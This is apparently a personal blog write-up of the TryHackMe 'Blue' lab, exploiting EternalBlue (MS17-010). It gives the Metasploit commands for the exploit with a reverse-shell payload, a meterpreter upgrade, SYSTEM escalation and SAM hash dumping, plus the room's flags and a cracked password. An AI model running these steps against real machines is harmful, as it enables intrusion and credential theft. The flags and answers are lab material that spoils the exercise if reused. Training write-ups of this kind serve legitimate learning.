# 💙 Blue Machine - My First Windows Exploitation Journey

```
  ____  _            __  __            _     _            
 | __ )| |_   _  ___|  \/  | __ _  ___| |__ (_)_ __   ___ 
 |  _ \| | | | |/ _ \ |\/| |/ _` |/ __| '_ \| | '_ \ / _ \
 | |_) | | |_| |  __/ |  | | (_| | (__| | | | | | | |  __/
 |____/|_|\__,_|\___|_|  |_|\__,_|\___|_| |_|_|_| |_|\___|
                                                          
    🎯 Exploiting Windows with EternalBlue (MS17-010)
```

---

## 🌟 Introduction

The **Blue** machine on TryHackMe was my first hands-on experience with Windows exploitation. This beginner-friendly room taught me how to exploit the infamous **EternalBlue** vulnerability (MS17-010) that was used in the WannaCry ransomware attack. 

This wasn't meant to be a complex CTF challenge, but rather an educational journey to understand the complete exploitation process from reconnaissance to post-exploitation.

---

## 🔍 Phase 1: Reconnaissance & Scanning

### Initial Network Scan
My first step was to scan the target machine to identify open ports and services. The machine doesn't respond to ICMP pings, so I went straight to port scanning.

**Key Findings:**
- **3 ports open** under port 1000
- Machine vulnerable to **MS17-010** (EternalBlue)

💡 **Learning Point:** Not all machines respond to ping, so don't assume they're down if ICMP fails.

---

## ⚔️ Phase 2: Exploitation with Metasploit

### Setting Up the Exploit
I fired up Metasploit and configured the EternalBlue exploit:

```bash
# Started Metasploit Framework
msfconsole

# Selected the EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configured target
set RHOSTS [TARGET_IP]

# Set specific payload for better shell
set payload windows/x64/shell/reverse_tcp

# Launched the attack
exploit
```

**Result:** Successfully gained initial shell access to the Windows machine! 🎉

---

## 🚀 Phase 3: Privilege Escalation & Shell Upgrade

### Converting Shell to Meterpreter
The basic shell was functional but limited. I needed to upgrade it to a more powerful Meterpreter session:

```bash
# Backgrounded the shell (CTRL + Z)
# Used shell-to-meterpreter conversion
use post/multi/manage/shell_to_meterpreter

# Set the session ID
set SESSION [SESSION_ID]

# Ran the conversion
run
```

### Escalating to SYSTEM
Once I had the Meterpreter session, I escalated privileges:

```bash
# Confirmed SYSTEM privileges
getsystem
whoami  # Returned NT AUTHORITY\SYSTEM

# Listed running processes
ps

# Migrated to a stable SYSTEM process
migrate [PROCESS_ID]
```

💡 **Learning Point:** Process migration is crucial for maintaining stable access and proper privilege context.

---

## 💰 Phase 4: Credential Harvesting

### Dumping Password Hashes
With SYSTEM privileges, I could extract password hashes from the SAM database:

```bash
# Dumped all password hashes
hashdump
```

**Discovery:** Found a non-default user named **Jon**

### Hash Cracking
I copied Jon's password hash and used an offline cracking tool:

**Cracked Password:** `alqfna22`

🔐 **Learning Point:** Even with strong privileges, password cracking often requires offline analysis with wordlists and brute-force techniques.

---

## 🏆 Phase 5: Flag Hunting

I discovered three flags representing key Windows system locations:

### Flag 1: System Root
**Location:** System root directory  
**Flag:** `flag{access_the_machine}`

### Flag 2: Password Storage Location
**Location:** Where Windows stores password hashes (SAM database area)  
**Flag:** `flag{sam_database_elevated_access}`

### Flag 3: Administrator Documents
**Location:** Administrator's document folder  
**Flag:** `flag{admin_documents_can_be_valuable}`

---

## 🎓 Key Lessons Learned

### Technical Skills Gained:
- **Port Scanning:** Identifying services without ICMP
- **Exploit Selection:** Choosing appropriate exploits for discovered vulnerabilities
- **Metasploit Mastery:** Using msfconsole, setting payloads, and managing sessions
- **Privilege Escalation:** Understanding Windows privilege contexts
- **Post-Exploitation:** Hash dumping, password cracking, and system enumeration

### Security Insights:
- **Patch Management:** MS17-010 was a critical vulnerability that should have been patched
- **Defense in Depth:** Single vulnerabilities can lead to complete system compromise
- **Monitoring:** These attacks generate significant logs that defenders should monitor

---

## 🔮 What's Next?

This Blue machine experience gave me confidence in:
- Using Metasploit effectively
- Understanding Windows exploitation
- Post-exploitation techniques
- The importance of proper patching

---

## 📊 Attack Timeline Summary

1. **Reconnaissance** → Port scanning and vulnerability identification
2. **Initial Access** → EternalBlue exploitation via Metasploit  
3. **Persistence** → Shell-to-Meterpreter conversion
4. **Privilege Escalation** → Process migration to SYSTEM context
5. **Credential Access** → SAM database hash dumping
6. **Collection** → Flag hunting across system locations

---

📌 **Reflection:** The Blue machine was an excellent introduction to Windows exploitation. It demonstrated how a single unpatched vulnerability can lead to complete system compromise, emphasizing the critical importance of security patching and monitoring in enterprise environments.

---

✍️ *This blog documents my hands-on experience with the Blue machine as part of my TryHackMe cybersecurity journey.*